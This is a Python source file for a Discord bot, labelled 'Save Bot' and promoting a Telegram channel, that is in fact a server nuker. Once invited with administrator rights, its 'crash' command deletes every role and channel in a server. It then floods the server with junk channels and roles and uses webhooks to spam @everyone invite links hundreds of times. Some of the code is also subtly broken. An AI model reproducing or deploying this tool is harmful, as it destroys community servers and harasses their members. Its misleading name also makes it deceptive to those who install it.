# Save Bot
# https://t.me/numoun


import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
from threading import Thread
import time
from discord.utils import get
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter

intents = discord.Intents.all()
bot = commands.Bot(command_prefix = "", intents=intents)
with open('icon.jpg', 'rb') as f:
    avatar = f.read()

@bot.event
async def on_ready():
    activity = discord.Streaming(name='t.me/numoun', url = 'https://twitch.tv/unknownpage')
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print(f'https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')

async def kill_ch(ctx,ch):
    try: 
        await ch.delete()
    except: 
        pass

async def kill_rl(ctx,role):
    try:
        await role.delete()
    except: 
        pass

async def createch(ctx):
    try:
        c = await ctx.guild.create_text_channel(f'cr4sh3ddd-{random.randint(1, 100000)}')
    except: 
        pass
    else:
        pass

async def createrl(ctx):
    try:
        await ctx.guild.create_role(f'Cr4sh3ddd {random.randint(1, 1000000)}')
    except:
        pass

async def spamch(ctx):
    try:
        await ch.send('@everyone @here ссылка на прекрасных: https://discord.gg/F9uNynGkDM', tts=True)
    except:
        pass

@bot.command()
async def crash(ctx):
    await ctx.message.delete()
    for rolee in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx,role=rolee))
    for channel in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx,ch=channel))
    for _ in range(25):
        asyncio.create_task(createch(ctx))
        asyncio.create_task(createrl(ctx))

async def create_webhook(channel):
    try:
        webhook = await channel.create_webhook(name=f'Cr4sh3ddd')
    except:
        pass
    asyncio.create_task(spam(webhook))
async def spam(webhook):
    for i in range(200):
        try:
            await webhook.send('@everyone @here ссылка на прекрасных: https://discord.gg/F9uNynGkDM')
        except:
            pass

@bot.event
async def on_guild_channel_create(channel):
    asyncio.create_task(create_webhook(channel))
    for webhook in await channel.webhooks():
        asyncio.create_task(spam(webhook))



bot.run('')

